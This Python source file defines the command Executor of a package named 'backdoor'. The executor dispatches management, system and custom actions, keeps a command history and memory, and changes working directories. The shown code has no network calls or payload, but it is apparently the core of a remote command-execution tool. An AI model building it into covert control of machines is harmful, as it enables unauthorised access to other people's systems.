# executor.py

import os
from dataclasses import dataclass, field
from typing import Callable

from backdoor.command import Command, CommandCapsule
from backdoor.action import Action
from backdoor.actions import Actions

__all__ = [
    "Executor"
]

JsonValue = str | bytes | dict | list | int | float | bool | None
ActionsDict = dict[str, Callable[[CommandCapsule], JsonValue]]

class BaseError(Exception):

    pass

class ActionValidationError(BaseError):

    pass

class MemoryValidationError(BaseError):

    pass

class DataValidationError(BaseError):

    pass

@dataclass(slots=True)
class Executor:

    history: list[str] = field(default_factory=list)
    running: list[str] = field(default_factory=list)
    commands: dict[str, Command] = field(default_factory=dict)
    memory: dict[str, ...] = field(default_factory=dict)
    actions: dict[str, ActionsDict] = field(init=False, default_factory=dict)
    custom: dict[str, Command | None] = field(default_factory=dict)
    root_location: str = field(default_factory=os.getcwd)
    current_location: str = field(default_factory=os.getcwd)
    save: Callable[[Command], ...] = None
    load: Callable[[str], Command] = None
    delete: Callable[[str], ...] = None

    def __post_init__(self) -> None:

        actions = Actions()

        management = actions.management
        system = actions.system
        data = actions.data
        execution = actions.execution

        execution.actions[execution.CUSTOM] = self._custom

        management.actions[management.RERUN] = lambda c: self._rerun()
        management.actions[management.CLEAN] = lambda c: self._clean()
        management.actions[management.LAST] = lambda c: self._last()
        management.actions[management.COMMAND] = self._command
        management.actions[management.STOP] = self._stop
        management.actions[management.FORGET] = self._forget
        management.actions[management.DELETE] = self._delete
        management.actions[management.ADD] = self._add

        system.actions[system.ROOT] = lambda c: self._root()
        system.actions[system.CWD] = lambda c: self._cwd()
        system.actions[system.CD] = self._cd

        self.actions.update(actions.actions)

        for group in (management, system, data, execution):
            self.actions[group.TYPE] = group.actions

    def clean(self) -> None:

        self.history.clear()
        self.memory.clear()
        self.commands.clear()
        self.custom.clear()

    def _clean(self) -> None:

        self.clean()

    def _rerun(self) -> JsonValue:

        return self.execute(self._last_command()).response.data()

    def _cwd(self) -> JsonValue:

        return self.current_location

    def _cd(self, capsul: CommandCapsule) -> None:

        self.current_location = capsul.command.request.data()

        os.chdir(self.current_location)

    def _root(self) -> None:

        self.current_location = self.root_location

        os.chdir(self.current_location)

    def _last_command(self) -> Command:

        if not self.history:
            raise ValueError("Commands history is empty.")

        return self.commands[self.history[-1]]

    def _last(self) -> JsonValue:

        return self._last_command().dump()

    def _command(self, capsul: CommandCapsule) -> JsonValue:

        command_id = capsul.command.request.data() or capsul.command.request.name

        if command_id not in self.commands:
            raise ValueError(f"No command found with id: '{command_id}'.")

        return self.commands[command_id].dump()

    def _add(self, capsul: CommandCapsule) -> JsonValue:

        try:
            command = Command.load(capsul.command.request.data())

        except (ValueError, TypeError):
            raise TypeError("Invalid custom command data.")

        self.add(command)

        return f"Custom command named '{command.id}' was added."

    def _custom(self, capsul: CommandCapsule) -> JsonValue:

        command_id = capsul.command.request.data() or capsul.command.request.name

        if command_id not in self.custom:
            raise ValueError(f"No custom command found with id: '{command_id}'.")

        if self.custom[command_id] is None:
            if self.load:
                try:
                    self.custom[command_id] = self.load(command_id)

                except Exception as e:
                    raise RuntimeError(
                        f"Failed to load custom command '{command_id}': {e}"
                    )

            else:
                raise ValueError(
                    "A loader must be defined to set and "
                    "run preexisting custom command."
                )

        return self.execute(self.custom[command_id]).dump()

    def remove(self, command: Command) -> None:

        command_id = command.id

        if command_id not in self.custom:
            raise ValueError(f"No custom command found with id: '{command_id}'.")

        self.custom.pop(command_id)

        if self.delete:
            self.delete(command_id)

    def _delete(self, capsul: CommandCapsule) -> JsonValue:

        command_id = capsul.command.request.data() or capsul.command.request.name

        if command_id not in self.custom:
            raise ValueError(f"No custom command found with id: '{command_id}'.")

        self.custom.pop(command_id)

        error = None

        if self.delete:
            try:
                self.delete(command_id)

            except Exception as e:
                error = str(e)

        message = f"Custom command named '{command_id}' was deleted."

        if error:
            message += f" Failed to run the custom delete operation: {error}"

        return message

    def _stop(self, capsul: CommandCapsule) -> JsonValue:

        command_id = capsul.command.request.data() or capsul.command.request.name

        if command_id not in self.commands:
            raise ValueError(f"No command found with id: '{command_id}'.")

        self.commands[command_id].stop()

        return "Command was stopped."

    def _forget(self, capsul: CommandCapsule) -> JsonValue:

        command_id = capsul.command.request.data() or capsul.command.request.name

        if command_id not in self.commands:
            raise ValueError(f"No command found with id: '{command_id}'.")

        self.commands.pop(command_id).stop()

        if command_id in self.history:
            self.history.remove(command_id)

        if command_id in self.running:
            self.running.remove(command_id)

        return "Command was stopped and deleted from history."

    def add(self, command: Command) -> None:

        self.custom[command.id] = command

        if self.save:
            try:
                self.save(command)

            except Exception as e:
                raise RuntimeError(
                    f"Failed to save custom command '{command.id}': {e}"
                )

    def action(self, action: Action) -> Callable[[CommandCapsule], JsonValue]:

        if action.type not in self.actions:
            error = (
                f"Unrecognized action type: '{action.type}'. "
                f"Valid action types: "
                f"{', '.join(map(lambda s: f"'{s}'", self.actions))}"
            )

        else:
            if action.name not in self.actions[action.type]:
                error = (
                    f"Unrecognized action type: '{action.name}'. "
                    f"Valid action types: "
                    f"{', '.join(map(lambda s: f"'{s}'", self.actions[action.type]))}"
                )

            else:
                return self.actions[action.type][action.name]

        raise ActionValidationError(error)

    def append(self, command: Command) -> None:

        self.running.append(command.id)

        self.commands[command.id] = command

    def finish(self, command: Command) -> None:

        command.stop()

        self.register(command)

    def register(self, command: Command) -> None:

        if not (command.error or command.running):
            command.complete = True

        if command.complete:
            command.running = False

            command.response.update(self.memory)

            if command.id in self.running:
                self.running.remove(command.id)

            if not command.forget:
                self.history.append(command.id)

        if not command.forget:
            self.commands[command.id] = command

    def execute(self, command: Command) -> Command:

        value = None
        error = None

        self.append(command)

        try:
            if not command.valid:
                raise DataValidationError(
                    'A name must be given with data for read/write actions'
                )

            try:
                command.request.upload(self.memory)

            except KeyError:
                raise MemoryValidationError(
                    f"'{command.request.name}' could not be found in memory."
                )

            command.request.update(self.memory)

            action = self.action(command.action)

            repetitions = command.action.repetitions

            capsul = CommandCapsule(
                memory=command.memory or self.memory, command=command,
                on_finish=lambda c: self.finish(c.command)
            )

            value = [action(capsul) for _ in range(repetitions)]

            if repetitions == 1:
                value = value[0]

        except BaseError as e:
            error = f"An error raised before execution: {e}"

        except Exception as e:
            error = f"An error raised on execution: {e}"

        command.respond(value)
        command.error = error

        self.register(command)

        return command
